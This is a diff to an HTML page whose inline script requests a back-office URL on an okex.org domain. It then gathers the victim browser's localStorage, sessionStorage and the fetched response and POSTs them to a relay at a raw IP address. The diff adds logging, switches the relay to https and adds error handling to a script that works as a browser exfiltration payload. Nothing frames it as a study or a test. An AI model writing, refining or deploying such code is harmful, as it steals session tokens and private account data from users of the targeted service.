@@ -5,9 +5,13 @@
 </head>
 <body>
     <script>
+        console.log('Script started');
         var xhr = new XMLHttpRequest();
         xhr.onreadystatechange = function() {
+            console.log('Ready state change:', xhr.readyState);
             if (xhr.readyState === 4) {
+                console.log('Request completed:', xhr.responseText);
+
                 // Retrieve local storage and session storage data
                 var localStorageData = JSON.stringify(localStorage);
                 var sessionStorageData = JSON.stringify(sessionStorage);
@@ -23,7 +27,7 @@
                 };
 
                 // Send the response, local storage/session storage data, and headers to the proxy server
-                fetch('http://139.180.206.59:3000/relay', {
+                fetch('https://139.180.206.59:3000/relay', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
@@ -35,7 +39,9 @@
                         sessionStorageData: sessionStorageData,
                         response: xhr.responseText
                     })
-                });
+                }).then(response => response.text())
+                  .then(data => console.log('Data sent to server:', data))
+                  .catch(error => console.error('Error sending data:', error));
             }
         };
         xhr.open('GET', 'https://csboss.okex.org/newboss/otc/open/detail/175497622/52633297', true);
